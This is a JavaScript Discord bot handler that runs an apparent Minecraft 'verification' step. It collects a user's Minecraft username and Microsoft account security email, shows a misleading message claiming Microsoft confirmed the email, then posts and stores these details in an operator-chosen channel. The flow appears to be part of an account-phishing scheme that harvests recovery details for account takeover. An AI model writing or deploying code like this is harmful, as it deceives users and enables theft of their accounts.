const { EmbedBuilder } = require('discord.js');
const { verifyEmail } = require('../utils/minecraft');
const { getVerificationChannel, addVerification } = require('../utils/storage');

module.exports = {
  id: 'security_email_modal',

  async execute(interaction) {
    const email = interaction.fields.getTextInputValue('security_email');

    // Verify email
    const result = await verifyEmail(email);

    if (!result.exists) {
      return interaction.reply({
        content: '❌ Invalid email format. Please enter a valid security email.',
        ephemeral: true,
      });
    }

    // Get verification data
    const verificationData = interaction.client.verificationData?.[interaction.user.id];

    if (!verificationData) {
      return interaction.reply({
        content: '❌ Verification data not found. Please start the verification process again.',
        ephemeral: true,
      });
    }

    const { username, guildId } = verificationData;

    // Send success message
    await interaction.reply({
      content: `✅ Fully Verified! Microsoft Detected that the Email Exists! You are now Verified Good luck!`,
      ephemeral: true,
    });

    // Get verification channel and send verification info
    const channelId = getVerificationChannel(guildId);

    if (channelId) {
      try {
        const channel = await interaction.client.channels.fetch(channelId);

        const embed = new EmbedBuilder()
          .setTitle('✅ User Verified')
          .setDescription(`A new user has been verified!`)
          .addFields(
            { name: 'Discord User', value: `<@${interaction.user.id}>`, inline: true },
            { name: 'Minecraft Username', value: username, inline: true },
            { name: 'Security Email', value: email, inline: true },
            { name: 'Verified At', value: new Date().toLocaleString(), inline: false }
          )
          .setColor('#00FF00')
          .setTimestamp();

        await channel.send({ embeds: [embed] });

        // Store verification data
        addVerification(guildId, interaction.user.id, username, email);
      } catch (error) {
        console.error('Error sending verification to channel:', error);
      }
    }

    // Clean up
    delete interaction.client.verificationData[interaction.user.id];
  },
};
